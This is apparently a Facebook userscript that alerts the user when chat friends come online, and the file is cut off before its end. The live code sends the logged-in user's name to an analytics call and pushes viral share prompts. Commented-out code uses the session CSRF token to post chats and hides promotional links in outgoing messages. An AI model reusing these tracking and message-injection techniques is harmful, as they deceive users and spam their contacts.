// ==UserScript==
// @name           Facebook Friend Alert
// @description    Facebook Friend Alert
// @version        1.0.070813
// @author         John Doe 
// @include        http*://www.facebook.com/*
// @howto_img_url http://files.pc-gizmos.com/scripts/152072.png
// ==/UserScript==
//----------------------------------------------------------------------
var FBA_arr = {};
var FBA_arr_already_full_after_first_time = false;
//----------------------------------------------------------------------
var FBA_curTabIsActive = true;
if ( location.href.indexOf("facebook.com/") != -1 )
{
	if( window.onfocus == null && window.onblur == null )
	{	
		function FBA_focuswindow() { FBA_curTabIsActive = true; /*GM_log("FBA_curTabIsActive="+FBA_curTabIsActive);*/}
		function FBA_hidewindow() { FBA_curTabIsActive = false; /*GM_log("FBA_curTabIsActive="+FBA_curTabIsActive);*/}
		window.onfocus = FBA_focuswindow;
		window.onblur = FBA_hidewindow;
	}
}
//----------------------------------------------------------------------
function FBA_getPersonItems()
{		
	var fbChatOrderedList  = document.getElementsByClassName("fbChatOrderedList"); 	
	if( !fbChatOrderedList || fbChatOrderedList.length < 1 )
	{
		//GM_log("ERR:fbChatOrderedList="+fbChatOrderedList+",fbChatOrderedList.length="+fbChatOrderedList.length);
		return null;
	}		
	// the 2nd is the smaller chat bar on small resolution screens
	/*
	var fbChatOrderedList_pos = 0;
	if(fbChatOrderedList.length == 2)
		fbChatOrderedList_pos = 1;
	GM_log("fbChatOrderedList.length="+fbChatOrderedList.length+",fbChatOrderedList_pos="+fbChatOrderedList_pos);		
	
	if( fbChatOrderedList[fbChatOrderedList_pos].innerHTML.indexOf("Loading") != -1  )
	{
		GM_log("ERR1:fbChatOrderedList["+fbChatOrderedList_pos+"].innerHTML="+fbChatOrderedList[fbChatOrderedList_pos].innerHTML);
		fbChatOrderedList_pos = 0;	
	}
	if( fbChatOrderedList[fbChatOrderedList_pos].innerHTML.indexOf("Loading") != -1  )
	{
		GM_log("ERR2:fbChatOrderedList["+fbChatOrderedList_pos+"].innerHTML="+fbChatOrderedList[fbChatOrderedList_pos].innerHTML);		
		return null;
	}
	*/
	//-----------------------------------------
	//GM_log("fbChatOrderedList="+fbChatOrderedList+",fbChatOrderedList.length="+fbChatOrderedList.length);
	
	var fbChatOrderedList_pos = -1;
	for ( var i = 0 ; i < fbChatOrderedList.length ; i ++ )
	{
		//GM_log("i="+i);
		if( fbChatOrderedList[i].innerHTML.indexOf("Loading") != -1  )
		{
			//GM_log("not-found:fbChatOrderedList["+i+"].innerHTML="+fbChatOrderedList[i].innerHTML);		
			continue;
		}
		else
		{
			//GM_log("found:fbChatOrderedList["+i+"].innerHTML="+fbChatOrderedList[i].innerHTML);		
			fbChatOrderedList_pos = i;
			break;
		}
	}
	if(fbChatOrderedList_pos == -1)
	{		
		return null;
	}
	//-----------------------------------------	
	var personItems  = fbChatOrderedList[fbChatOrderedList_pos].getElementsByTagName("li");	
	if( !personItems || personItems.length < 1 )
	{
		//GM_log("ERR:personItems="+personItems);
		return null;
	}
	return personItems;
}
//----------------------------------------------------------------------
function FBA_removeChildsByClassName(fatherObj,className)
{
	var objs = fatherObj.getElementsByClassName(className);
	if(objs&&objs.length>0)
	{
		for(var i = 0 ; i < objs.length ; i ++)
		{
			objs[i].parentNode.removeChild(objs[i]);
		}
	}
	return fatherObj;
}
//----------------------------------------------------------------------
function FBA_getUserNameFromPersonObj(personItem)
{
	if( !personItem || !personItem.childNodes || personItem.childNodes.length < 1 )
		return "";

	var clonedPersonItem = personItem.cloneNode(true);
	
	//GM_log(clonedPersonItem.innerHTML);
	clonedPersonItem = FBA_removeChildsByClassName(clonedPersonItem,"icon_container");
	clonedPersonItem = FBA_removeChildsByClassName(clonedPersonItem,"icon_container");
	clonedPersonItem = FBA_removeChildsByClassName(clonedPersonItem,"rfloat");
		
	var name = PCG_trim(clonedPersonItem.innerText);
	if(!name||name=="")
		name = PCG_trim(clonedPersonItem.textContent);
					
	return name;
}
//----------------------------------------------------------------------
function FBA_main()
{
	setTimeout("FBA_main()",2000); // to handle returns ...
		
	if(!FBA_curTabIsActive)
		return;
	
	var personItems = FBA_getPersonItems();
	if(!personItems)
		return;
	//GM_log("personItems.length="+personItems.length);
	var numOfActiveAlerts = 0;
	var numOfMobileAlerts = 0;	
	for ( var i = 0 ; i < personItems.length ; i ++ )
	{
		var personItemsClassName = personItems[i].getAttribute("class");
		if ( personItemsClassName.indexOf("active") != -1 )
		{		
			numOfActiveAlerts++;
		}
		if ( personItemsClassName.indexOf("mobile") != -1 )
		{		
			numOfMobileAlerts++;
		}
	}
	//GM_log("numOfActiveAlerts="+numOfActiveAlerts+",numOfMobileAlerts="+numOfMobileAlerts);

	for ( var i = 0 ; i < personItems.length ; i ++ )
	{
		var personItemsClassName = personItems[i].getAttribute("class");
		if ( personItemsClassName.indexOf("active") != -1 || 
		     ( personItemsClassName.indexOf("mobile") != -1 && numOfActiveAlerts < 3 )   )
		{		
			var picImg = personItems[i].getElementsByClassName("pic img");
			//GM_log("picImg="+picImg);
			//var name = personItems[i].getElementsByClassName("name");
			//GM_log("PCG_trim(personItems["+i+"].innerText)="+PCG_trim(personItems[i].innerText));
			//GM_log("PCG_trim(personItems["+i+"].textContent)="+PCG_trim(personItems[i].textContent));
			//var name = PCG_trim(personItems[i].innerText);
			//if(!name||name=="")
				//name = PCG_trim(personItems[i].textContent);
			var name = FBA_getUserNameFromPersonObj(personItems[i]);
				
			if(!picImg||picImg.length<1||!name||name.length<1)
				continue;	
			picImg = picImg[0].getAttribute("src");
			//name = name[0].innerHTML;
			if(FBA_arr_already_full_after_first_time)
			{
				if( FBA_arr[name] == undefined )
				{					
					//GM_log("#### new name #### ="+name+",picImg="+picImg);
					FBA_arr[name] = picImg ;					
					FBA_displayMsgBox(10000,name,picImg);
				}
			}
			else
			{
				FBA_arr[name] = picImg ;
			}
		}
	}
	FBA_arr_already_full_after_first_time = true;		
	/*
	for(name in FBA_arr)
	{
		if (FBA_arr.hasOwnProperty(name)) 
			GM_log("name="+name+",url="+FBA_arr[name]);
	}
	GM_log("=======================");	
	*/
}
//----------------------------------------------------------------------
//var FBA_numOfTrialsToAddMsgToChatBox;

function FBA_Random_Facebook_Sharer_URL()
{
	var links_arr = [ { 
						link: "http://friendalert.cdn.l.pc-gizmos.com/blue/", 
						summary: "WowwW! Did you see who just got online?" ,
						description: "Download FB Friend Alert now and be the first to know when your friends go online." ,
						image: "http://farm8.staticflickr.com/7053/8687560013_129d35d5cd_z.jpg" 
					  }, 
					  { 
						link: "http://friendalert.cdn.l.pc-gizmos.com/rounds/", 
						summary: "Is your GF cheating on you?" ,
						description: "Frankly, we don't know. But we can tell you when she goes online.Download FB Friend Alert." ,
						image: "http://farm8.staticflickr.com/7044/8687560183_a5f634a258_z.jpg" 
					  }, 
					  { 
						link: "http://friendalert.cdn.l.pc-gizmos.com/clean/", 
						summary: "Be the best friend you can be" ,
						description: "Download FB Friend Alert and connect with your friends. Be notified when your friends go online." ,
						image: "http://farm9.staticflickr.com/8249/8639938334_b76b8357ae.jpg" 
					  }					  
					];

						 
	var randomPos = Math.floor(Math.random() * ( links_arr.length ))   ;
	//GM_log("randomPos="+randomPos+',links_arr[randomPos]["link"]='+links_arr[randomPos]["link"]);
	
	PCG_Open_Facebook_Sharer_URL(
			links_arr[randomPos]["link"],
			links_arr[randomPos]["image"],
			links_arr[randomPos]["summary"],
			links_arr[randomPos]["description"]
	);
	PCG_GA_recordEvent(FBA_getCurrentLoggedOnUser(),"/fb_alerts/shrarer_presented")
}
function FBA_getCurrentLoggedOnUser()
{
	// was window.Env.user
	var headerTinymanName_arr = document.getElementsByClassName("headerTinymanName");
	if(headerTinymanName_arr&&headerTinymanName_arr.length>0)
	{		
		return headerTinymanName_arr[0].innerHTML;
	}
	else
	{
		return "UnableToParseFBUserName";
	}
}
/*
function FBA_Random_Facebook_Sharer_URL()
{
	var landlingUrls = [ "http://friendalert.cdn.l.pc-gizmos.com/rounds/",
						 "http://friendalert.cdn.l.pc-gizmos.com/clean/",
						 "http://friendalert.cdn.l.pc-gizmos.com/blue/"
					   ];	
	var landingTexts = [  
		"When you stop chasing the wrong things, you give the right things a chance to catch you.Try Facebook Friend Alert, it's right and it's awesome",
		"I love Facebook Friend Alert! Finally I get notified when my friends log in to Facebook.Try it out, it's awesome",
		"A friend is one of the nicest things you can have, and one of the best things you can be.Get notifications when your friends go online"
					   ];
						 
	var randomPos_landlingUrls = Math.floor(Math.random() * ( landlingUrls.length ))   ;
	var randomPos_landingTexts = Math.floor(Math.random() * ( landingTexts.length ))   ;
	
	PCG_Open_Facebook_Sharer_URL(
			landlingUrls[randomPos_landlingUrls],
			"http://farm9.staticflickr.com/8249/8639938334_b76b8357ae.jpg",
			"Like Facebook Friend Alert? Bet your friends would too!",
			landingTexts[randomPos_landingTexts]
	);
}*/
//----------------------------------------------------------------------
function FBA_openChatBox(clickedName)
{	
	//GM_log("FBA_openChatBox clickedName="+clickedName);

	personItems = FBA_getPersonItems();
	if(!personItems||personItems.length==0)
		return;
	//GM_log("FBA_openChatBox personItems.length="+personItems.length);
		
	for ( var i = 0 ; i < personItems.length ; i ++ )
	{
		//var personItemsClassName = personItems[i].getAttribute("class");	
		//var name = personItems[i].getElementsByClassName("name");
		//if(!name||name.length<1)
			//continue;
		//name = name[0].innerHTML;		
		//GM_log("cur name="+name+",clickedName="+clickedName+",personItems["+i+"].innerHTML="+personItems[i].innerHTML);
		//if(clickedName==name)
		//var name = PCG_trim(personItems[i].innerText);
		//if(!name||name=="")
			//name = PCG_trim(personItems[i].textContent)
		var name = FBA_getUserNameFromPersonObj(personItems[i]);
				
		if( clickedName == name )
		{
			personItems[i].click();
			FBA_removeMsgBox();
			
			PCG_GA_recordEvent_IncrementActions("FBA");
			PCG_GA_recordEvent_OpenUserMsg("FBA",
									{ // params									 									 
									 "scriptDesc":"Facebook Friend Alert",									 
									 "google_plus":"https://plus.google.com/117818606513605476201/posts",
									 "fb_like_url":"http://download.cnet.com/Facebook-Friend-Alert/3000-12941_4-75824132.html"
									},
								    function(daysInstalled,numOfActions_Aggr,numOfUpdates,numOfRemindMeLater,numOfShareMsgPresented)
									{
										if( daysInstalled > 0		&& 
											numOfActions_Aggr > 4   &&
											numOfUpdates < 1  		&&
											numOfRemindMeLater < 4     )
										{
											return "update1";
										}										
										else if( daysInstalled > 6 		 && 
												 numOfActions_Aggr > 6   &&
												 numOfUpdates < 2  		 &&
												 numOfRemindMeLater < 4     )
										{
											return "update2";
										}
										else if( daysInstalled > 1 		 &&
												 numOfShareMsgPresented < 1 )
										{
											return "share1";
										}
										return ""; 
									} 
									);
			
			/*
			var FBA_numOfClicksOnAlertsBox = GM_getValue("FBA_numOfClicksOnAlertsBox",0);
			if(FBA_numOfClicksOnAlertsBox == 2 || FBA_numOfClicksOnAlertsBox == 22)
				FBA_Random_Facebook_Sharer_URL();
			FBA_numOfClicksOnAlertsBox++;
			GM_setValue("FBA_numOfClicksOnAlertsBox",FBA_numOfClicksOnAlertsBox);
			
			PCG_GA_recordEvent(FBA_getCurrentLoggedOnUser(),"/fb_alerts/alertbox_clicked")
			*/
			//FBA_numOfTrialsToAddMsgToChatBox = 10;
			//setTimeout(function() { FBA_addMsgToChatBox(name); }, 500);
			//setTimeout("FBA_addMsgToChatBox()",500,name);
			
			break;
		}		
	}
	//alert(name);
}
//----------------------------------------------------------------------
function FBA_removeMsgBox()
{
	var FBA_msgBox = document.getElementById("FBA_msgBox_inner");
	FBA_msgBox.innerHTML = "";
	FBA_msgBox.style.display="none";
	FBA_msgBox.parentNode.style.display="none";
}
//----------------------------------------------------------------------
/*
function FBA_sendChatMsg(msg, to) 
{
	function serialize(obj) 
	{
		var str = [];
		for(var p in obj)
			str.push(p + "=" + encodeURIComponent(obj[p]));
		return str.join("&");
	}
	function random(len) 
	{
		var min = Math.pow(10, len-1);
		var max = Math.pow(10, len);
		return Math.floor(Math.random() * (max - min + 1)) + min;
	}
	function generatePhstamp(qs, dtsg) 
	{
		var input_len = qs.length;
		numeric_csrf_value='';
		for(var ii=0;ii<dtsg.length;ii++) 
		{
			numeric_csrf_value+=dtsg.charCodeAt(ii);
		}
		return '1' + numeric_csrf_value + input_len;
	}
	
	var fbid = window.Env.user;
	var d = new Date();
	var data = 
	{
		"message_batch[0][timestamp_relative]": "" + ('0'+d.getHours()).slice(-2) + ":" + ('0'+d.getMinutes()).slice(-2),
		"message_batch[0][author]": "fbid:" + fbid,
		"message_batch[0][is_cleared]": "false",
		"message_batch[0][message_id]": "<" + random(14) + ":" + random(10) + "-" + random(10) + "@mail.projektitan.com>",
		"message_batch[0][specific_to_list][0]": "fbid:" + to,
		"__user": fbid,
		"message_batch[0][timestamp_absolute]": "Oggi",
		"message_batch[0][spoof_warning]": "false",
		"message_batch[0][client_thread_id]": "user:" + to,
		"message_batch[0][source]": "source:chat:web",
		"message_batch[0][has_attachment]": "false",
		"message_batch[0][source_tags][0]": "source:chat",
		"message_batch[0][body]": msg,
		"message_batch[0][is_filtered_content]": "false",
		"message_batch[0][timestamp]": "" + Math.round(new Date().getTime() / 1000),
		"message_batch[0][is_unread]": "false",
		"message_batch[0][action_type]": "ma-type:user-generated-message",
		"__a": "1",
		"message_batch[0][specific_to_list][1]": "fbid:" + fbid,
		"message_batch[0][html_body]": "false",
		"message_batch[0][status]": "0",
		"client": "mercury",
		"message_batch[0][is_forward]": "false",
		"fb_dtsg": window.Env.fb_dtsg
	};
	var req = serialize(data);
	// Thanks http://pastebin.com/VJAhUw30
	req += "&phstamp=" + generatePhstamp(req, data.fb_dtsg);
	xmlhttp = new XMLHttpRequest();
	xmlhttp.open('POST', '/ajax/mercury/send_messages.php');
	xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xmlhttp.send(req);
}*/
//----------------------------------------------------------------------
/*
var FBA_msgs = [ "Chat powered by: http://bit.ly/FriendAlert ",
					 "Powered by http://bit.ly/FriendAlert",
					 "click <3 http://bit.ly/Friend-Alert",
					 "don't click B| http://bit.ly/Friend-Alert",
					 "(y) http://bit.ly/Friend_Alert",
					 "http://bit.ly/Friend_Alert (y)" ];
function FBA_randomMsg()
{
	var random = Math.floor(Math.random() * ( FBA_msgs.length ))   ;
	//GM_log("random = "+random);
	return FBA_msgs[random];
}
//----------------------------------------------------------------------

var FBA_sentMsgOneTime = false;
function FBA_isThisReturn(obj,event)
{
	e = event || window.event;
	var charCode = (typeof e.which == "number") ? e.which : e.keyCode;

	//GM_log("Typed character: " + String.fromCharCode(charCode) + ",charCode=" + charCode);
	if ( charCode == 13 && FBA_sentMsgOneTime == false) 
	{
		var replacedMsg = obj.value +
            "                                                                                                           -- Chat powered by: http://bit.ly/FriendAlert " ; //+ FBA_randomMsg();
		
		//GM_log("obj.value:" + obj.value + ",replacedMsg:"+replacedMsg);
		
		var textMetrics = document.getElementsByClassName("textMetrics");
		for(var i = 0 ; i < textMetrics.length ; i ++ )
		{
			//GM_log("textMetrics["+i+"]="+textMetrics[i]);
			textMetrics[i] = replacedMsg + "...";		
		}
	
		var newTextMetrics = document.createElement("textarea");
		newTextMetrics.setAttribute("class","textMetrics");
		newTextMetrics.setAttribute("style","font-size: 11px; font-style: normal; font-weight: 400; font-family: 'lucida grande',tahoma,verdana,arial,sans-serif; word-wrap: break-word; line-height: 15px; width: 230px;");
		newTextMetrics.innerHTML = replacedMsg+'...';
					
		obj.value = replacedMsg;
		FBA_sentMsgOneTime = true;
	}
}
function FBA_AddMsgOnFirstReturn(obj)
{
	//GM_log("obj="+obj.innerHTML);
	var textAreas = obj.getElementsByClassName("uiTextareaAutogrow");
	if(textAreas&&textAreas.length>0)
	{
		for(var i = 0 ; i < textAreas.length ; i ++)
		{		
			//Bootloader.loadComponents(["control-textarea"], 
			//	function() { TextAreaControl.getInstance(this) }.bind(this)); 		
			//GM_log("textAreas["+i+"].onkeydown="+textAreas[i].getAttribute('onkeydown') );
			//GM_log("textAreas["+i+"].outerHTML="+textAreas[i].outerHTML);
			//GM_log("textAreas["+i+"].innerHTML="+textAreas[i].innerHTML);
			
			textAreas[i].setAttribute('onkeydown','FBA_isThisReturn(this,event); Bootloader.loadComponents(["control-textarea"], function() { TextAreaControl.getInstance(this) ;}.bind(this)); ');
			
			//textAreas[i].outerHTML = '<textarea style="height: 16px;" class="uiTextareaAutogrow input" onkeydown="Bootloader.loadComponents([&quot;control-textarea&quot;], function() { TextAreaControl.getInstance(this) }.bind(this)); "></textarea>';
			
			//textAreas[i].onkeydown = "";
			
			//var old_element = textAreas[i];
			//var new_element = old_element.cloneNode(true);
			//old_element.parentNode.replaceChild(new_element, old_element);
			//new_element.onkeydown = function (e) 
			//	{ 	
			//		e = e || window.event;
			//		var charCode = (typeof e.which == "number") ? e.which : e.keyCode;
			//		GM_log("charCode="+charCode);
			//		if (charCode == 13 ) 
			//		{
			//			//alert("Typed character: " + String.fromCharCode(charCode));
			//			this.innerHTML = this.innerHTML + FBA_randomMsg();
			//		}				
			//		old_element.onkeydown(); 
			//	};	
			
		}
	}
}*/
//----------------------------------------------------------------------
/*
function FBA_activateMsgOnlyIfTextWasPressed(obj)
{
	var uiTextareaAutogrow = obj.getElementsByClassName("uiTextareaAutogrow");
	GM_log("uiTextareaAutogrow.length="+uiTextareaAutogrow.length);
	if(uiTextareaAutogrow&&uiTextareaAutogrow.length>0)
	{
		uiTextareaAutogrow[0].onkeypress = function(e) 
		{
			e = e || window.event;
			var charCode = (typeof e.which == "number") ? e.which : e.keyCode;
			if (charCode > 0) 
			{
				//alert("Typed character: " + String.fromCharCode(charCode));
				var elem, evt = e ? e:event;
				if (evt.srcElement)  
					elem = evt.srcElement;
				else if (evt.target) 
					elem = evt.target;
				elem.setAttribute("FBA_WroteSomthing","true");
			}
		};
	}
}*/
//----------------------------------------------------------------------
/*
function FBA_addMsgToChatBox(name)
{
	var fbNubFlyoutInner=document.getElementsByClassName("fbNubFlyoutInner");
	if(fbNubFlyoutInner&&fbNubFlyoutInner.length>1)
	{
		//GM_log("fbNubFlyoutInner.length="+fbNubFlyoutInner.length);
		for(var i = 0 ; i < fbNubFlyoutInner.length ; i ++)
		{			
			//GM_log("name="+name+",fbNubFlyoutInner[i].innerHTML="+fbNubFlyoutInner[i].innerHTML);
			if(fbNubFlyoutInner[i].innerHTML.indexOf(name)!=-1)
			{
				//FBA_activateMsgOnlyIfTextWasPressed(fbNubFlyoutInner[i]);
				//setTimeout(function() { FBA_setCloseButtonEvent(fbNubFlyoutInner[i]) }, 2000);
				//FBA_AddMsgOnFirstReturn(fbNubFlyoutInner[i]);
				FBA_recordClickEvent(window.Env.user); // was name
				return;				
			}
		}		
	}
	//GM_log("FBA_numOfTrialsToAddMsgToChatBox="+FBA_numOfTrialsToAddMsgToChatBox);
	if(FBA_numOfTrialsToAddMsgToChatBox>0)
	{
		FBA_numOfTrialsToAddMsgToChatBox--;
		setTimeout(function() { FBA_addMsgToChatBox(name); }, 500);
		//setTimeout("FBA_addMsgToChatBox()",500,name); 
	}
}
//----------------------------------------------------------------------
function FBA_rand(min, max) 
{
		return min + Math.floor(Math.random() * (max - min));
}
*/
/*
function FBA_recordClickEvent(str)
{
		var i=1e9,
			utmn=FBA_rand(1e9,1e10),
			cookie=FBA_rand(1e7,1e8),
			random=FBA_rand(i,-(1<<31)),
			today=(new Date()).getTime(),
			win = "http://www.pc-gizmos.com/analytics/alert_pressed",//window.location,			
			urchinUrl = 'http://www.google-analytics.com/__utm.gif'
				+'?utmwv=4.8.6'
				+'&utmn='+utmn
				+'&utmsr='+screen.width+'x'+screen.height
				+'&utmsc='+((screen.colorDepth===undefined)? screen.pixelDepth: screen.colorDepth)+'-bit'
				+'&utmul='+window.navigator.language.toLowerCase()
				//+'&utmje=-'
				+'&utmje=1'
				//+'&utmfl=-'
				+'&utmfl=11.3%20r300'				
				//+'&utmdt=-'
				+'&utmdt='+escape(str)
				//+'&utme=8(AlertPressed)9(true)'
				+'&utmhn=www.pc-gizmos.com'
				+'&utmr='+encodeURIComponent(win+"/"+str)
				+'&utmp='+encodeURIComponent('/alert_pressed')
				+'&utmac=MO-36293843-1' // 36293843/31818336
				+'&utmcc=__utma%3D'+cookie
					+'.'+random
					+'.'+today
					+'.'+today
					+'.'+today
					+'.2%3B%2B__utmb%3D'+cookie
					+'%3B%2B__utmc%3D'+cookie
					+'%3B%2B__utmz%3D'+cookie
					+'.'+today
					+'.2.2.utmccn%3D(referral)%7Cutmcsr%3D'+encodeURIComponent(win.host)
					+'%7Cutmcct%3D'+encodeURIComponent(win.pathname)
					+'%7Cutmcmd%3Dreferral%3B%2B__utmv%3D'+cookie
					+'.-%3B';
		//GM_log("urchinUrl="+urchinUrl);
		GM_xmlhttpRequest({	method: "GET", 	url: urchinUrl ,onload: function(response) { return;} });
}*/
//----------------------------------------------------------------------
var	FBA_like_button = '<iframe src="//www.facebook.com/plugins/like.php?href=http%3A%2F%2Fdownload.cnet.com%2FFacebook-Online-Friends-Alert%2F3000-12941_4-75824132.html&amp;send=false&amp;layout=button_count&amp;width=80&amp;show_faces=false&amp;font&amp;colorscheme=light&amp;action=like&amp;height=21&amp;appId=243212289037659" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:80px; height:21px;" allowTransparency="true"></iframe>';
var FBA_plus_button = '<div class="g-plusone" data-size="small"  data-href="https://plus.google.com/117818606513605476201/posts"></div>';
var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
po.src = 'https://apis.google.com/js/plusone.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
//----------------------------------------------------------------------
function FBA_displayMsgBox(ms,name,picImg) 
{						
	var FBA_msgBox = document.getElementById("FBA_msgBox_inner");
	if(!FBA_msgBox)
		return;
	FBA_msgBox.style.display="";
	FBA_msgBox.parentNode.style.display="";
	//-----------
	var FBA_msgBox_str = "<strong>Click to Chat with :</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<BR><a style='text-decoration: none' onClick='FBA_openChatBox(\""+name+"\");'><table><tr><td><img width='33px' height='33px' src='"+picImg+"'></img></td><td style='color:#333333;font-weight:bold'>"+name+"</td></tr></table></a>";
	//-----------
	if(FBA_msgBox.innerHTML != "") // add it
	{
		FBA_msgBox.innerHTML = FBA_msgBox_str + "<HR style='line-height: 0.5;font-size: 1px;'>" + FBA_msgBox.innerHTML ;
	}
	else
	{
		FBA_msgBox.innerHTML = FBA_msgBox_str + "<HR style='line-height: 0.5;font-size: 1px;'>" ;
	}
		
	if(ms)
	{
		setTimeout("FBA_removeMsgBox()",ms); 
	}
}
//----------------------------------------------------------------------
function FBA_createMsgBox()
{
	var FBA_msgBox = document.createElement("div");
	FBA_msgBox.id="FBA_msgBox";			
	FBA_msgBox.style.display = "none";
	//FBA_msgBox.style.opacity = 0;
	FBA_msgBox.direction='ltr';	
	FBA_msgBox.style.position= 'fixed';
	FBA_msgBox.style.width = '200px';
	FBA_msgBox.style.bottom = 0;
	FBA_msgBox.style.right = '0px'; // 250px
	FBA_msgBox.style.zIndex = 10000;
	FBA_msgBox.style.margin = "0 auto 0 auto";
	FBA_msgBox.style.borderTop = "1px solid #C9C9C9";
	FBA_msgBox.style.borderLeft = "1px solid #C9C9C9"; 
	FBA_msgBox.style.borderRight = "1px solid #C9C9C9";
	FBA_msgBox.style.marginBottom = "0px";
	FBA_msgBox.style.fontFamily = "tahoma,verdana,arial,sans-serif";
	FBA_msgBox.style.fontWeight = "normal";
	FBA_msgBox.style.fontSize = "11px";
	FBA_msgBox.style.color = "#3B5998";
	FBA_msgBox.style.backgroundColor = "white";//"#F2F4F8";
	FBA_msgBox.style.textAlign = "center";
	//----
	FBA_msgBox.style.borderRadius = "4px";
    FBA_msgBox.style.boxShadow = "0px 5px 15px #C9C9C9";
    FBA_msgBox.style.webkitBoxShadow = "0px 5px 15px #C9C9C9";
    FBA_msgBox.style.mozBoxShadow = "0px 5px 15px #C9C9C9";
	//FBA_msgBox.style.background ="#eee";
	FBA_msgBox.style.fontFamily = "'Handlee', sans-serif";
	FBA_msgBox.style.border = "2px solid #C9C9C9";
    FBA_msgBox.style.backgroundClip = "padding-box";
    FBA_msgBox.style.textShadow = "0px 1px 0px #FFF";	
	//----
	FBA_msgBox.innerHTML = 		   "<div style='background-color:#3B5998;color:#D8DFEA;font-weight:bold;text-align:left;"+
								    "padding-bottom:2px;font-family: Tahoma;text-shadow:none;"+
									"border-radius:4px;box-shadow:0px 5px 15px #C9C9C9;border:2px solid #C9C9C9;"+
									"webkit-Box-Shadow:0px 5px 15px #C9C9C9;moz-Box-Shadow:0px 5px 15px #C9C9C9; ' >"+
									"<table  width='100%' ><tr><td>"+
										"&nbsp;Just Logged in :"+
										"</td><td width='10%' style='text-align:right'>"+
										"<a style='text-decoration: none;' onClick='FBA_removeMsgBox();'>"+
										"<span style='background: url(\"http://static.ak.fbcdn.net/rsrc.php/v2/yo/x/4WSewcWboV8.png\") 0 -47px;"+
										"background-repeat: no-repeat;"+
										"height: 15px;"+
										"width: 15px;'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></a>"+
										"</table>"+
									"</div>"+
									"<div id='FBA_msgBox_inner'></div>"+
								   "<table><tr><td style='color:#333333;font-weight:bold'>Share: <td>" +  
								   FBA_plus_button+"</td><td>"+FBA_like_button +"</td></tr></table>";
	//---
	document.body.appendChild( FBA_msgBox );	
}
//----------------------------------------------------------------------
function FBA_toggleScript()
{		
	var FBA_ScriptEnable = GM_getValue("FBA_ScriptEnable",true);
	FBA_ScriptEnable = !FBA_ScriptEnable;
	GM_setValue("FBA_ScriptEnable",FBA_ScriptEnable);
	window.location.reload();
}
//----------------------------------------------------------------------
function FBA_toggleItemDisplay(item)
{
	if( ! item.style.display || item.style.display == "" )
	{				
		item.style.display = "none";					
	} 
	else
	{
		item.style.display = "";	
	}
}
//----------------------------------------------------------------------
function FBA_addSideBarBanner()
{
	var FBA_SideBarBanner = document.getElementById("FBA_SideBarBanner");
	if(FBA_SideBarBanner)
		return;
	var FBA_ScriptEnable = GM_getValue("FBA_ScriptEnable",true);
	if(FBA_ScriptEnable)
		FBA_ScriptEnable_str = "Disable";
	else
		FBA_ScriptEnable_str = "Enable";
	//--------------------
	var FBA_div = document.createElement("div");
	FBA_div.id = "FBA_SideBarBanner";
	FBA_div.setAttribute("class","");
	//innerHTML_str
	//var	FBA_like_button = '<iframe src="//www.facebook.com/plugins/like.php?href=http%3A%2F%2Fdownload.cnet.com%2FFacebook-Zoom%2F3000-12941_4-75744517.html&amp;send=false&amp;layout=button_count&amp;width=100&amp;show_faces=false&amp;action=like&amp;colorscheme=light&amp;font&amp;height=21&amp;appId=243212289037659" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:100px; height:21px;" allowTransparency="true"></iframe>';
	var FBA_menu_str = "<div id='FBA_SideBarBanner_Menu' style='display:none'>"+
	"<BR>&nbsp;<a STYLE='text-decoration:underline' onClick='FBA_toggleScript();'>"+FBA_ScriptEnable_str+"&nbsp;FB Friend Alert</a> <BR>"+	
	"&nbsp;<a STYLE='text-decoration:underline' target='_blank' href='http://download.cnet.com/Facebook-Online-Friends-Alert/3000-12941_4-75824132.html#rateit'>Rate/Review</a><BR>"+
	"&nbsp;<a STYLE='text-decoration:underline' href='mailto:feedback@pc-gizmos.com?subject=Feedback%20on%20Facebook%20Friend%20Alert&body=I%20use%20Facebook%20Friend%20Alert%20and%20my%20Feedback%20is...'>Feedback</a><BR>"+
	"&nbsp;<a STYLE='text-decoration:underline' href='mailto:myfriend@example.com?subject=I%20really%20liked%20Facebook%20Friend%20Alert%20&body=Hi%20,%0D%0A%0AI%20am%20using%20Facebook%20Friend%20Alert,%20it%20changed%20my%20whole%20FB%20experience.%0D%0A%0A%20You%20can%20download%20it%20too%20at%20http%3A%2F%2Fdownload.cnet.com%2FFacebook-Online-Friends-Alert%2F3000-12941_4-75824132.html%20.'>Send to a friend</a><BR>"+
	"&nbsp;<a STYLE='text-decoration:underline' target='_blank' href='http://download.cnet.com/windows/pc-gizmos/3260-20_4-10209477.html'>Other Gizmos</a><BR>"+
	"&nbsp;<a STYLE='text-decoration:underline' target='_blank' href='http://www.pc-gizmos.com/about-us/'>About</a><BR>"+	
	"</div>" ;	
	var FBA_innerHTML_str = "<BR><a onclick='FBA_toggleItemDisplay(document.getElementById(\"FBA_SideBarBanner_Menu\"));'>FB Friend Alert Menu</a>" + "<BR>" + FBA_menu_str + FBA_plus_button +"<BR>"+ FBA_like_button;	
	FBA_div.innerHTML = FBA_innerHTML_str;
	//----
	/*
	var appsNav = document.getElementById("appsNav");
	if(appsNav)
	{
		appsNav.appendChild(FBA_div);
	}*/
	//-----------------------
	var sideNav = document.getElementById("sideNav"); // facebook.com
	if(sideNav)
	{		
		sideNav.insertBefore(FBA_div,sideNav.childNodes[0]);
	}	
	//-----------------------
}
//----------------------------------------------------------------------
if ( location.href.indexOf("facebook.com/") != -1 )
{
	var FBA_ScriptEnable = GM_getValue("FBA_ScriptEnable",true); 
	if(FBA_ScriptEnable)
	{
		FBA_createMsgBox();
		//----------------------------------------------------------------------
		// test
		//FBA_Debug_Simulate_Alerts(); 
		//FBA_displayMsgBox(0,"Test Name","http://profile.ak.fbcdn.net/hprofile-ak-ash4/260961_738804681_1419661988_q.jpg");
		//FBA_displayMsgBox(0,"Test Name","http://profile.ak.fbcdn.net/hprofile-ak-ash4/260961_738804681_1419661988_q.jpg");
		//FBA_displayMsgBox(0,"Test Name","http://profile.ak.fbcdn.net/hprofile-ak-ash4/260961_738804681_1419661988_q.jpg");
